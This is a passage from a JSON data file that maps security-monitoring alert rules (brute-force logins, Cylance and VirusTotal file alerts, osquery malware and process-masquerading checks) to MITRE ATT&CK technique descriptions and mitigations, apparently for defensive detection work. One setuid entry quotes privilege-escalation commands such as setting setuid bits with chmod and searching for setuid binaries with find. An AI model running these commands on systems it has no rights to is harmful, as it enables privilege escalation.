            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 86803,
        "rule_description": "VShell user used the maximum number of password attempts.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 86806,
        "rule_description": "VShell multiple connection attempts within 2 minute by a host in the deny file, potential DOS or brute force attempt.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 86807,
        "rule_description": "VShell host has exceeded the number of failed login attempts and has been added to the Hosts Deny file.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 87001,
        "rule_description": "Cylance: File $(cylance_events.filepath) is unsafe.",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 87002,
        "rule_description": "Cylance: File $(cylance_events.filepath) is abnormal.",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 87003,
        "rule_description": "Cylance: File $(cylance_events.filepath) is quarantined.",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 87053,
        "rule_description": "Cylance Threat: File $(cylance_threats.file_path) is abnormal",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 87105,
        "rule_description": "VirusTotal: Alert - $(virustotal.source.file) - $(virustotal.positives) engines detected this file",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 87202,
        "rule_description": "Proxmox VE brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 87302,
        "rule_description": "ownCloud brute force (multiple failed logins).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 87303,
        "rule_description": "ownCloud possible malicious request.",
        "mitre_id": [
            "T1203",
            "T1102"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution",
            "Web Service"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks.",
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 87503,
        "rule_description": "Exim: brute force attack (multiple auth failures).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 87702,
        "rule_description": "Multiple pfSense firewall blocks events from same source.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 24059,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): File $(osquery.columns.path) has setuid enabled",
        "mitre_id": [
            "T1548.001"
        ],
        "possible_attacks": [
            "Setuid and Setgid"
        ],
        "description": [
            "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification]( The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery]( The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries."
        ],
        "mitigation_strategies": [
            "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system."
        ]
    },
    {
        "rule_id": 24061,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): ARP cache: Address $(osquery.columns.address) MAC $(osquery.columns.mac) Interface $(osquery.columns.interface)",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 24215,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): MaMi malware detected, infected DNS address $(osquery.columns.address)",
        "mitre_id": [
            "T1071"
        ],
        "possible_attacks": [
            "Application Layer Protocol"
        ],
        "description": [
            "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. "
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."
        ]
    },
    {
        "rule_id": 24701,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): CCleaner Trojan Floxif detected on registry path $(osquery.columns.path)",
        "mitre_id": [
            "T1547.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 24702,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): CCleaner Trojan Floxif detected on service $(osquery.columns.name) for user $(osquery.columns.user_account)",
        "mitre_id": [
            "T1569.002"
        ],
        "possible_attacks": [
            "Service Execution"
        ],
        "description": [
            "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](\n\n[PsExec]( can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec]( and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service]( during service persistence or privilege escalation."
        ],
        "mitigation_strategies": [
            "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
        ]
    },
    {
        "rule_id": 24705,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): unTabs Browser extension malware detected on path $(osquery.columns.install_location)",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24706,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): unTabs Chrome extension malware detected $(osquery.columns.name)",
        "mitre_id": [
            "T1176"
        ],
        "possible_attacks": [
            "Browser Extensions"
        ],
        "description": [
            "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners. Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control]( Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion]( "
        ],
        "mitigation_strategies": [
            "\nClose out all browser sessions when finished using them to prevent any potentially malicious extensions from continuing to run."
        ]
    },
    {
        "rule_id": 24708,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): Sticky registry key backdoor detected for key $(osquery.columns.path)",
        "mitre_id": [
            "T1547.001",
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 24709,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): conhost.exe process masquerading detected, path is $(osquery.columns.path)",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24710,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): dllhost.exe process masquerading detected, path is $(osquery.columns.path)",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24711,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): lsass.exe process masquerading detected, path is $(osquery.columns.path)",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24712,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): services.exe process masquerading detected, the parent process is incorrect",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
            "Train users not to open email attachments or click unknown links (URLs). Such training fosters more secure habits within your organization and will limit many of the risks.  "
        ]
    },
    {
        "rule_id": 24713,
        "rule_description": "osquery: $(osquery.pack) $(osquery.subquery): svchost.exe process masquerading detected, path $(osquery.columns.path) is incorrect",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
